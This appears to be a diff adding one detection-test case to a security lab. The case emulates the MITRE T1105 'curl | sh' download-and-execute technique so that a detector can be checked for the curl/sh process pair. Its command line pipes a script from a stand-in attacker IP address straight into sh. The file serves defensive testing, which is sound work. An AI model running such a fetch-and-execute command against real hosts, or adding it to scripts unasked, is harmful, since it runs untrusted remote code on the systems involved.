@@ -1,0 +1,22 @@
+- id: linux_curl_pipe_sh
+  name: curl | sh persistence
+  description: |
+    Models the download-and-execute pattern: curl pulls a payload from an
+    attacker host and pipes the body directly into sh. The fetch fails
+    fast (no payload server in the lab), but the (curl, sh) sibling
+    process pair is what we want to surface. Phase 21 expects no
+    detection (Gap 1, A1+A2 evidence).
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    linux:
+      sh:
+        command: |
+          # The fail-fast curl writes nothing to disk; the sh receives an
+          # empty body and exits 0. The two child processes (curl, sh)
+          # under the calling bash are what a chain detector would see.
+          /bin/bash -c 'curl -s --max-time 3 http://198.51.100.77/payload.sh | sh || true'
+        cleanup: |
+          true
